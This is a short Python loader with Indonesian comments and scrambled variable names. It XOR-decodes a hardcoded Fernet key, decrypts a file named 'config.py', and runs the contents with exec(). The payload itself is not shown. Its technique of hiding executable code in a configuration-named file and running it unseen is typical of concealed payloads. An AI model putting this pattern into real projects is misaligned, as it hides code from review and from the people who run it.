import base64
from cryptography.fernet import Fernet

# Fungsi XOR untuk menyamarkan data
def _x98h2A(_d, _k):
    return bytes(a ^ b for a, b in zip(_d, _k * (len(_d) // len(_k) + 1)))

# Key terenkripsi (dari enkripsi.py)
_90gKj2L = b'AW+\x1b3\x19\x18T1-\tC\x15\x04;G\\\x0eJ\x06\rF\n\x1c> \x104,#%4\x168,\x15\x18\x0f!?\x031\x14X'  # Ganti dengan hasil dari `enkripsi.py`

# Kembalikan key asli menggunakan XOR
_77Zx3bD = _x98h2A(_90gKj2L, b'secret')

# Objek cipher untuk dekripsi
_Kt1p39L = Fernet(_77Zx3bD)

# Baca file terenkripsi
with open('config.py', 'rb') as _mLx9tY5:
    _Jq3X8vB = _mLx9tY5.read()

# Dekripsi file
_Ax8Lq02 = _Kt1p39L.decrypt(_Jq3X8vB)

# Jalankan kode yang telah didekripsi
exec(_Ax8Lq02.decode())
